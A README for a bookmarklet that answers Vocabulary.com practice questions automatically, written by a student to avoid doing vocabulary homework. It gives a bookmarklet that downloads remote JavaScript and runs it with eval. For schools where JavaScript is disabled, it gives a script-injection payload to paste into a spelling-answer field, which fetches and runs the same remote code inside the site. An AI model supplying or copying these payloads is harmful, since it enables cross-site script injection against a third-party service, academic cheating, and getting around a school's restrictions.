# Vocabulary.com Bot Bookmarklet
Automatic Vocabulary.com mastery bookmarklet \
Automatically answers questions (auto answer) \
I made this because im too lazy to do my vocab 🤑

![](auto.gif)

## IMPORTANT
> My school disabled javascript from running so this will not be updated from now on!
> If you're wondering if your javascript is disabled copy this and paste in the url:
```JS
javascript: alert("Javascript is enabled");
```
No alert = no javascript

## HOW TO RUN (Javascript enabled)
Make a new bookmark with this as the link & click it on your vocabulary.com practice
```JS
javascript:  fetch("https://raw.githubusercontent.com/urdakota/Vocabulary.com/main/Bypass/index.js").then((res) => res.text().then((t) => eval(t)))
```
## HOW TO RUN (Javascript disabled)
Work on the vocab till you get a fill in the blank question (spelling bee whateva)
Paste this code in
```JS
"><script>
    fetch(&apos;https://raw.githubusercontent.com/urdakota/Vocabulary.com/main/Bypass/index.js &apos;)
      .then(
      response => {
        response.text()
          .then(a=> exec(a))
        
      }
      )</script>
```
code from [here](https://stackoverflow.com/questions/63859970/loading-external-js-script-in-post-parameter-xss-reflected-attack)
KEEP THE " AT THE START OR IT WONT RUN

## What it does 🤔
- Automatically guesses & remembers the answers for multiple choice questions
- Automatically guesses & remembers the answers for image questions
- Automatically fills in the answer for spelling questions
